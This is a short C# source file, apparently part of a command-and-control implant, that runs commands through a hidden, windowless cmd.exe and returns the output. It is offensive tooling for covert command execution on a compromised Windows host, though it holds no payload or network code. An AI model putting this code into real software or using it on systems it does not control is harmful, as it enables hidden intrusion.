using System;
using System.Diagnostics;
using System.Text;

namespace Implant.Tasks.Execute
{
    class CMDShellFunctions
    {
        public static Process CreateInstance()
        {
            Process CmdProc = new Process();
            CmdProc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            CmdProc.StartInfo.FileName = "cmd.exe";
            CmdProc.StartInfo.UseShellExecute = false;
            CmdProc.StartInfo.RedirectStandardOutput = true;
            CmdProc.StartInfo.RedirectStandardError = true;
            CmdProc.StartInfo.RedirectStandardInput = true;
            CmdProc.StartInfo.CreateNoWindow = true;
            return CmdProc;
        }


        // send cmd to execute to obj generated from CreateInstance
        public static String Execute(Process proc, string cmd)
        {
            proc.StartInfo.Arguments = $"/C {cmd}";
            StringBuilder _out = new StringBuilder();

            proc.Start();
            _out.AppendLine(proc.StandardOutput.ReadToEnd());
            _out.AppendLine(proc.StandardError.ReadToEnd());
            proc.WaitForExit();
            proc.Dispose();

            return _out.ToString().Trim('\n');
        }

    }
}
